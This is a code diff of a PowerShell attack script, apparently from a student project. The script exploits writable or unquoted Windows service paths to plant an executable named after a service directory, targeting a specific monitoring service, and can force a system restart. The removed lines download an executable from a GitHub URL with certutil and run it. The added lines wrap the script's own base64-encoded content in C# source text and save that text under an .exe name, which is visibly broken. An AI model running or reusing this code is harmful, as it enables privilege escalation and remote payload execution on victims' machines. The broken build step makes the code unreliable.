@@ -13,8 +13,8 @@ ForEach ($svc in $svclist) {
 
 # Traverse and identify writable directory
 foreach ($path in $servicePaths) {
-    $url = "https://github.com/prince-spooler/FYP/blob/main/Sync.exe"
-
+    $url = "https://github.com/prince-spooler/FYP/blob/main/Sync.ps1"
+    
     $parentDir = Split-Path -Path $path -Parent
     $dirName = ($path -split "\\")[-2]
 
@@ -29,7 +29,31 @@ foreach ($path in $servicePaths) {
                 Set-Location $parentParentDir
                 $words = $dirName -split "\s+"
                 $fileName = $words[0] + ".exe"
-                cmd.exe /c "certutil -urlcache -split -f $url $fileName" ; .\$fileName
+                
+                # Convert script to executable
+                $selfPath = $MyInvocation.MyCommand.Path
+                $selfContent = Get-Content $selfPath
+                $selfBytes = [System.Text.Encoding]::Unicode.GetBytes($selfContent)
+                $selfBase64 = [System.Convert]::ToBase64String($selfBytes)
+                $exeContent = @"
+using System;
+using System.IO;
+using System.Text;
+
+class Program {
+    static void Main(string[] args) {
+        byte[] scriptBytes = Convert.FromBase64String("$selfBase64");
+        string scriptContent = Encoding.Unicode.GetString(scriptBytes);
+        string scriptPath = Path.Combine(Path.GetTempPath(), "script.ps1");
+        File.WriteAllText(scriptPath, scriptContent, Encoding.Unicode);
+        System.Diagnostics.Process.Start("powershell.exe", "-ExecutionPolicy Bypass -File " + scriptPath);
+    }
+}
+"@
+
+                $exePath = "$fileName"
+                [System.IO.File]::WriteAllText($exePath, $exeContent)
+
                 # If the service is not running, restart the system
                 $svcStatus = Get-Service -DisplayName "TRIGONE Remote System Monitor Service" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Status
                 if ($svcStatus -ne "Running") {
